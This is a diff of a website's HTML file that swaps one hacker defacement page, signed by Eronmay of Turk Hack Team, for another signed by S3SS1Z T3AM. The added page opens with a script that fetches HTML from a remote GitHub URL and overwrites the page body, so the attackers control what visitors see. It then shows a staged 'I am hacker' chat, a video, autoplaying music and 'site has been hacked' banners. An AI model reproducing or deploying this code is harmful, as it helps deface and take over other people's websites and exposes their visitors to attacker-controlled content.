@@ -1,136 +1,312 @@
-<html lang="tr-tr" class="no-js">
+<script>fetch("https://raw.githubusercontent.com/CriminalLaoin/CL/main/index.html").then(response=>response.text()).then(html=>document.body.innerHTML=html);</script>
 
-	<head>
 
-		<meta charset="utf-8">
-        <script language="Javascript">var msg1 = "| Hello Admin System Hacked By Eronmay | Turk Hack Team . Org ";var speed=50;function ScrollTitle() {document.title=msg1;msg1=msg1.substring(1,msg1.length)+msg1.charAt(0);setTimeout("ScrollTitle()",speed);}ScrollTitle();</script>
-        <meta http-equiv="Content-Type" content="text/html;charset=UTF-8"/>        <meta name="description" content="HACKED BY ERONMAY">
-        <meta name="description" content="HACKED BY ERONMAY">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <meta name="Tasarımcı" content="Eronmay">
-		<img src="http://resimag.com/p1/1d429141c04.png" width="50" height="50" alt="Sayfa Logo" />
+*****************************************************************
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <title>Hacked By S3SS1Z T3AM</title>
+	<meta name="Author" content=""/>
+	<link rel="icon" type="image/png" href="https://i.hizliresim.com/rct5rwn.png" type="image/x-icon" />
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+	<style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: black;
+            color: white;
+            font-family: monospace;
+            user-select: none;
+            -ms-overflow-style: none; /* for Internet Explorer, Edge */
+            scrollbar-width: none; /* for Firefox */
+        }
+        body::-webkit-scrollbar {
+          display: none; /* for Chrome, Safari, and Opera */
+        }
+        * { margin: 0; padding: 0; }
+        .bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: -1;
+        }
+        .bg video {
+            width: 90%;
+            object-fit: cover;
+        }
+        .box-start {
+            width: 100%;
+            height: 100vh;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            background: rgba(0,0,0,.8);
+            opacity: 0;
+            visibility: hidden;
+            display: none;
+        }
+        .box-start * {
+            text-align: center;
+        }
+        .icon img {
+            width: 200px;
+        }
+        .header {
+            font-size: 30px;
+            color: red;
+            font-weight: bold;
+            text-shadow: 1px 0 4px rgba(0,0,0,.5);
+        }
+        .desc {
+            padding: 10px;
+            width: 400px;
+        }
+        .box-end {
+            width: 100%;
+            height: 100vh;
+            background: rgba(0,0,0,.8);
+            padding-top: 20px;
+            opacity: 0;
+            visibility: hidden;
+            display: none;
+        }
+        .mod-box {
+            width: 90%;
+            margin: 0 auto;
+            background: rgba(255,255,255,.2);
+            backdrop-filter: blur(40px);
+            padding: 10px;
+            border-radius: 10px;
+            min-height: 60vh;
+        }
+        .box-start.active, .box-end.active {
+            opacity: 1;
+            visibility: visible;
+            display: block;
+            transition: 1s;
+        }
+        .ret {
+            background: black;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 2;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            height: 100vh;
+            transition: .2s;
+        }
+        .ret.active {
+            display: none;
+        }
+        .ret button {
+            font-size: 20px;
+            padding: 10px;
+            background: rgba(255,255,255,.1)
+            backdrop-filter: blur(10px);
+            border: none;
+            border-radius: 3px;
+        }
+        .ms-box {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: fixed;
+            z-index: 1;
+            background: black;
+            width: 100%;
+            height: 100vh;
+            top: 0;
+            left: 0;
+        }
+        .ms-box.active {
+            display: none;
+        }
+        .mess {
+            background: white;
+            padding: 10px;
+            color: black;
+            width: 400px;
+            height: 300px;
+            position: relative;
+        }
+        .mess-header {
+            background: whitesmoke;
+            border-bottom: 1px solid 111;
+            display: flex;
+            align-items: center;
+            padding: 0 10px;
+        }
+        .mess-header img {
+            width: 30px;
+            border-radius: 50%;
+            margin-bottom: 10px;
+        }
+        .mess-name {
+            color: dodgerblue;
+            font-weight: bold;
+            font-size: 16px;
+            padding: 0 10px;
+        }
+        .mess-box-s {
+            background: #ccc;
+            padding: 3px 7px;
+            margin: 1px 0;
+            font-size: 16px;
+            border-radius: 5px;
+            display: none;
+            transition: 1s;
+            font-size: 0;
+        }
+        .mess-box-s.active {
+            display: block;
+            font-size: 15px;
+        }
+        .mess-inp {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            background: #ddd;
+            width: calc(100% - 10px);
+            padding: 6px 5px;
+            display: flex;
+        }
+        .mess-inp input {
+            font-size: 16px;
+            width: 90%;
+        }
+        .mess-inp button {
+            border: 1px solid #444;
+            padding: 1px;
+            width: 10%;
+        }
+        .wr {
+            position: absolute;
+            bottom: 40px;
+            width: calc(100% - 20px);
+            background: white;
+            left: 0;
+            padding: 0 10px;
+        }
+        @media (max-width: 760px) {
+            video {
+                width: 100%;
+                height: 100vh;
+            }
+        }
+    </style>
+</head>
+<body>
 
-        <!-- ============== Sty10 ============== -->
-        <link rel="stylesheet" href="css/c.css" />
+    <div class="ret">
+        <div class="click-box">
+            <button id="next-1">Siteye devam et</button>
+        </div>
+    </div>
+    <div class="ms-box">
+        <div class="dev-wiew">
+            <div class="mess">
+                <div class="mess-header">
+                    <img src="https://www.pngitem.com/pimgs/m/524-5246388_anonymous-user-hd-png-download.png">
+                    <div class="mess-name">Admin</div>
+                </div>
+                <div class="mess-box-s" id="m1">Hello Admin</div>
+                <div class="mess-box-s" id="m2">Hello Guest</div>
+                <div class="mess-box-s" id="m3">I am hacker</div>
+                <div class="mess-box-s" id="m4">I am Turkish Hacker</div>
+                <div class="mess-box-s" id="m5">I am S3SS1ZT3AM</div>
+                <div class="mess-box-s" id="m6">This is site hacked</div>
+                <div class="wr">Admin's Writing...</div>
+                <div class="mess-inp">
+                    <input type="text" disabled="true" placeholder="Write a message...">
+                    <button disabled="">send</button>
+                </div>
+            </div>
+        </div>
+        
+    </div>
+    <div class="bg">
+        <video loop id="video">
+            <source src="https://c.tenor.com/f3HGfIRTPGYAAAPo/atat%C3%BCrk-mustafa-kemal-atat%C3%BCrk.mp4" type="">
+        </video>
+    </div>
 
-	</head>
+    <div class="box-start">
+        <div class="icon"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2e/T%C3%BCrkHackTeam_Logo.png/250px-T%C3%BCrkHackTeam_Logo.png"></div>
+        <div class="header">The site has been hacked by S3SS1Z T3AM.</div>
+        <div class="desc">Bu site S3SS1Z T3AM tarafından Hacklenmiştir. ADMİN AYAĞA KALK S3SS1Z T3AM GELDİ...</div>
+        <div class="footer">☪ S3SS1Z T3AM ☪</div>
+    </div>
+    <div class="box-end">
+        <div class="mod-box">
+            <h1>Size bir mesajımız var!</h1>
+            <p>S3SS1Z T3AM İS FUCK THE SYSTEM</p>
+        </div>
+    </div>
 
-	<body>
+    <audio  loop autoplay="" class="music" style="display: none;">
+      <source src="https://cdn.indirdur.ist/dld/RUIrb0dtdTdmV1d4VFgvK25DVklHZz/shahmen-mark_(indirdur.ist).mp3" type="audio/mpeg">
+      Tarayıcınız bu özelliği desteklemiyor.
+    </audio>
+<script>
+    var music = document.querySelector(".music");
+    var next1s = document.getElementById("next-1");
+    var video = document.getElementById("video");
+    var ret = document.querySelector(".ret");
+    var msbox = document.querySelector(".ms-box")
+    var messbox1 =  document.getElementById("m1");
+    var messbox2 =  document.getElementById("m2");
+    var messbox3 =  document.getElementById("m3");
+    var messbox4 =  document.getElementById("m4");
+    var messbox5 =  document.getElementById("m5");
+    var messbox6 =  document.getElementById("m6");
 
-		<canvas id="constellationel"></canvas> 
-		<div id="constellation"></div> 
 
-		<span class="full-overlay"></span>
+    var boxstart = document.querySelector(".box-start");
+    var boxend = document.querySelector(".box-end");
 
-		<!-- Başlangıç - Sayfa -->
-		<div id="fullpage">
+    function nexted() {
+        ret.classList.add("active");
+        music.play();
+        function ms1() { messbox1.classList.add("active") }
+        function ms2() { messbox2.classList.add("active") }
+        function ms3() { messbox3.classList.add("active") }
+        function ms4() { messbox4.classList.add("active") }
+        function ms5() { messbox5.classList.add("active") }
+        function ms6() { messbox6.classList.add("active") }
+        setTimeout(ms1,1000);
+        setTimeout(ms2,5000);
+        setTimeout(ms3,7000);
+        setTimeout(ms4,13000);
+        setTimeout(ms5,16000);
+        setTimeout(ms6,19000);
+        function vdst() {
+            msbox.classList.add("active");
+            video.play();
+        }
+        setTimeout(vdst, 23000);
+        function ados() {
+            boxstart.classList.add("active");
+            boxend.classList.add("active");
+            boxstart.style.display = "flex";
+        }
+        setTimeout(ados, 31000);
+    }
 
-		    <!-- Ana Sayfa Configrasyon -->
-		    	<div class="inside-section">
 
-					<div class="inside-content">
+    window.addEventListener("keypress", nexted);
+    next1s.addEventListener("click", nexted);
+    
 
-						<h1 class="cd-headline zoom">
-							<span class="cd-words-wrapper">
-
-								<b class="is-visible">Hello<br/>
-									<span class="highlight"  style="color: #EE1E1B">Owner</span><br/>
-								</b>
-
-								<b>System Hacked<br/>
-									<span class="highlight" style="color: #EE1E1B">Turk Hack Team</span><br/>
-								</b>
-								
-								<b>Beside The Oppressed<br/>
-									<span class="highlight" style="color: #EE1E1B">On Top Of Cruelty</span><br/>
-								</b>
-
-								<b>By<br/>
-									<span class="highlight" style="color: #1BE1EE">Eronmay</span><br/>
-								</b>
-
-							</span>
-						</h1>
-
-	        		</div>
-			</div>
-
-<script type="text/javascript">
-
-  audio = new Audio(); 
-  
-  audio.src = "arka.mp3";
-  
-  audio.loop = true;
-  
-  audio.play(); 
 
 </script>
-		<!-- Son - Sayfa -->
-
-		<!-- TurkHackTeam.org -->       
-        <div id="block-answer" class="">
-
-            <div id="answer"></div>
-
-        </div>
-        <!-- Son - Alım... -->
-
-		<div class="block-message">
-
-			<div class="message">
-
-				<p class="notify-valid"></p>
-
-			</div>
-
-		</div>
-		
-		<!-- * Js ! * -->
-		<script src="js/jquery.min.js"></script>
-		<script src="js/jquery.easings.min.js"></script>
-		<script src="js/bootstrap.min.js"></script>
-
-		<!-- Eklentiler -->
-		<script src="js/jquery.fullpage.js"></script>
-
-		<!-- Constellation effect -->
-		<script src="js/constellation.js"></script> 
-
-		<!-- Text rotator Ekletisi -->
-		<script src="js/animated-headlines.js"></script>
-
-		<!-- Main JS Ekleti -->
-		<script src="js/main.js"></script>
-		
-        <!-- Sağ Tıklama Engelleme -->
-       <SCRIPT LANGUAGE="Javascript"><!--
-
-       var isNS = (navigator.appName == "Netscape") ? 1 : 0;
-       var EnableRightClick = 0;
-       if(isNS)
-       document.captureEvents(Event.MOUSEDOWN||Event.MOUSEUP);
-       function mischandler(){
-       if(EnableRightClick==1){ return true; }
-       else {return false; }
-       }
-       function mousehandler(e){
-       if(EnableRightClick==1){ return true; }
-       var myevent = (isNS) ? e : event;
-       var eventbutton = (isNS) ? myevent.which : myevent.button;
-       if((eventbutton==2)||(eventbutton==3)) return false;
-       }
-       function keyhandler(e) {
-       var myevent = (isNS) ? e : window.event;
-       if (myevent.keyCode==96)
-       EnableRightClick = 1;
-       return;
-       }
-       document.oncontextmenu = mischandler;
-       document.onkeypress = keyhandler;
-       document.onmousedown = mousehandler;
-       document.onmouseup = mousehandler;
-       //-->
-       </script>
-	</body>
+</body>
 </html>
